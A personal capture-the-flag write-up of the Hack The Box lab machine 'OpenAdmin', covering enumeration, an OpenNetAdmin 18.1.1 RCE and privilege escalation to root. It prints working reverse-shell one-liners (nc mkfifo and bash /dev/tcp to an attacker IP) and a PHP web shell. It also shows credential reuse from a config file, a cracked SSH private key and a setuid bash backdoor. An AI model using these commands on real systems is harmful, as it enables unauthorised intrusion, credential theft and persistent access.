---
title: "Hack The Box - OpenAdmin"
date: 2022-04-27T14:48:30+2:00
categories:
  - HackTheBox
  - WriteUp
  - Linux
tags:
  - OSCP Preparation
  - Credentials
  - Ona
  - SSH
  - Command Injection
  - GTFOBins
  - Nmap
  - Gobuster
---
# Introduction

---

OpenAdmin is an easy box rated 4.5, which is pretty good. I exploited an application on the webserver to get initial access. The privilege escalation was done by finding passwords on the system and abusing sudo access rights (GTFObins). Let’s start with the enumeration of the box.

# Enumeration

---

As always, I use Nmap for this.

## Nmap Scan

---

Here are the results of a simple scan of all ports:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin] 
└─$ sudo nmap -sS -p- -v openadmin.htb 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 08:00 CEST 
Initiating Ping Scan at 08:0
Scanning openadmin.htb (10.10.10.171) [4 ports]   
Completed Ping Scan at 08:00, 0.24s elapsed (1 total hosts)    
Initiating SYN Stealth Scan at 08:00       
Scanning openadmin.htb (10.10.10.171) [65535 ports] 
Discovered open port 22/tcp on 10.10.10.171   
Discovered open port 80/tcp on 10.10.10.171
Discovered open port 4444/tcp on 10.10.10.171
Completed SYN Stealth Scan at 08:14, 804.93s elapsed (65535 total ports)
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.21s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4444/tcp open  krb524

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 805.41 seconds
           Raw packets sent: 67668 (2.977MB) | Rcvd: 66698 (2.668MB)
```

I did a deep scan on the open ports found (with `-A` flag):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ sudo nmap -A -p 22,80,4444 openadmin.htb                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 08:15 CEST
Stats: 0:03:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.51% done; ETC: 08:18 (0:00:00 remaining)
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
4444/tcp open  krb524?
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), 
AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), 
Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 5.1 (93%), 
Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   226.72 ms 10.10.16.1
2   226.84 ms openadmin.htb (10.10.10.171)

Nmap done: 1 IP address (1 host up) scanned in 193.62 seconds
```

## Service Enumeration

---

The SSH service does not need further enumeration.

### Port 80 (HTTP Webserver)

---

I do a gobuster scan:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://openadmin.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,log
[+] Timeout:                 10s
===============================================================
2021/09/13 08:15:30 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/music                (Status: 301) [Size: 314] [--> http://openadmin.htb/music/]
/artwork              (Status: 301) [Size: 316] [--> http://openadmin.htb/artwork/]
/ona                  (Status: 301) [Size: 312] [--> http://openadmin.htb/ona/]
```

The most interesting page is ona:

![Untitled](/assets/images/2022-04-27-openadmin/Untitled.png)

It says that I'm not using the latest version, I'm using version 18.1.1. (In my eyes this is the latest version but the page does not think that. I can search for an exploit. I found an RCE exploit:

[GitHub - amriunix/ona-rce: OpenNetAdmin 18.1.1 - Remote Code Execution](https://github.com/amriunix/ona-rce)

# Exploitation

---

I downloaded the script and checked if the exploit would work:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ python3 ona-rce.py check http://openadmin.htb/ona
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] The remote host is vulnerable!
```

It's time to exploit the vulnerability, just replace the check with exploit in the command above:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ python3 ona-rce.py exploit http://openadmin.htb/ona
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I got a shell as www-data. In this shell, I cannot change directories, so I spawn a better reverse shell:

```bash
sh$ which nc
/bin/nc
sh$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 4444 >/tmp/f
```

Now, look at the netcat listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ nc -lvnp 4444                                  
listening on [any] 4444 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.171] 59790
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$ export TERM=xterm
export TERM=xterm
www-data@openadmin:/opt/ona/www$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@openadmin:/opt/ona/www$
```

I have a better shell now, so I can go on with the privesc.

# Privilege Escalation

---

## www-data → jimmy

---

I ran LinPEAS, but it could not find many useful things. One of the only dirs I can access is the web server, so I checked it again. I found a php file which connects to the local database:

`/var/www/html/ona/local/config/database_settings.inc.php`

```bash
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

I do not want to gain access as the mysql user, so I checked for password reuse (jimmy worked):

```bash
www-data@openadmin:/dev/shm$ su jimmy
Password: 
jimmy@openadmin:/dev/shm$ whoami
jimmy
```

That worked, I try to access over SSH, which is more stable than the netcat shell:

```bash
┌──(user㉿KaliVM)-[/tools/LinPEAS]
└─$ ssh jimmy@openadmin.
The authenticity of host 'openadmin.htb (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added openadmin.htb,10.10.10.171 (ECDSA) to the list of known hosts
jimmy@openadmin.htb's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

## jimmy → joanna

---

I found an apache config file called internal.conf (LinPEAS found the domain for this):

```xml
jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

This file shows me that there is an enabled site on port 52846, it also runs as joanna, so this might be used for privesc. I connect again with SSH and forwarded the port:

```bash
┌──(user㉿KaliVM)-[/tools/LinPEAS]
└─$ ssh jimmy@openadmin.htb -L 52846:localhost:52846
Last login: Mon Sep 13 11:05:55 2021 from 10.10.16.6
jimmy@openadmin:~$
```

I see the site, it is a login page. I remembered that it is running as joanna, so I can upload a web shell over the SSH connection:

```bash
jimmy@openadmin:/var/www/internal$ echo '<?php system($_GET["cmd"]); ?>' > cmd.php  
jimmy@openadmin:/var/www/internal$ cat cmd.php
<?php system($_GET["cmd"]); ?>
```

The site can now be curl-ed with the command:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ curl http://localhost:52846/cmd.php?cmd=id 
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
                                                                                                         
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ curl 'http://127.0.0.1:52846/cmd.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.6/4444%200%3E%261%27'
```

Now, look at the netcat listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.171] 34730
bash: cannot set terminal process group (1275): Inappropriate ioctl for device
bash: no job control in this shell
joanna@openadmin:/var/www/internal$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<nal$ python3 -c 'import pty;pty.spawn("/bin/bash")'
joanna@openadmin:/var/www/internal$ export TERM=xterm
export TERM=xterm
^Z
zsh: suspended  nc -lvnp 4444

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               
joanna@openadmin:/var/www/internal$
```

I got a shell as the user joanna.

### User Flag

---

As joanna I can read the user flag:

```bash
joanna@openadmin:/home/joanna$ cat user.txt
bf95**************************11
```

## joanna → root

---

To get a more stable shell, I grab the SSH key of user joanna and cracked it using john:

```bash
joanna@openadmin:/home/joanna/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
joanna@openadmin:/home/joanna/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

I crack the key using john:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
Session completed

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ john --show id_rsa_hash.txt                                     
id_rsa:bloodninjas

1 password hash cracked, 0 left
```

Now, I can log in as joanna with SSH:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ chmod 600 id_rsa

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/openadmin]
└─$ ssh joanna@openadmin.htb -i id_rsa
Enter passphrase for key 'id_rsa':
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

That worked, now I can work on the privesc for the root user. The first thing I tried is sudo -l:

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

I can open a specific file as sudo without a password in nano. So I searched for a GTFOBin:

[nano | GTFOBins](https://gtfobins.github.io/gtfobins/nano/#shell)

So I tried the GTFObins suggestion out:

```bash
Command to execute: reset; sh 1>&0 2>&0# ls
user.txt
#  Cancel
# ls
user.txt
# id
uid=0(root) gid=0(root) groups=0(root)
```

I have a root shell, but this shell is pretty unstable, so I create rootbash (I know I could just change the root password or create a copy of the root user, but I think for this box this is enough):

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Rootbash is now working, I try it on the SSH session as user jimmy:

```bash
jimmy@openadmin:/var/www/internal$ cd /tmp
jimmy@openadmin:/tmp$ ls
rootbash
systemd-private-35c536d8ed254533953f55d6d5996e6a-apache2.service-08sYEC
systemd-private-35c536d8ed254533953f55d6d5996e6a-systemd-resolved.service-YlyeVq
systemd-private-35c536d8ed254533953f55d6d5996e6a-systemd-timesyncd.service-oaO5IA
tmux-1000
vmware-root_612-2731021090
jimmy@openadmin:/tmp$ ./rootbash -p
rootbash-4.4# whoami
root
rootbash-4.4#
```

That's it. I have a root shell that is persistent. To get root access on the system, you only have to use the ona RCE and then call rootbash.

### Root Flag

---

Not much to say here, just get the flag:

```bash
rootbash-4.4# cat /root/root.txt
0643**************************20
```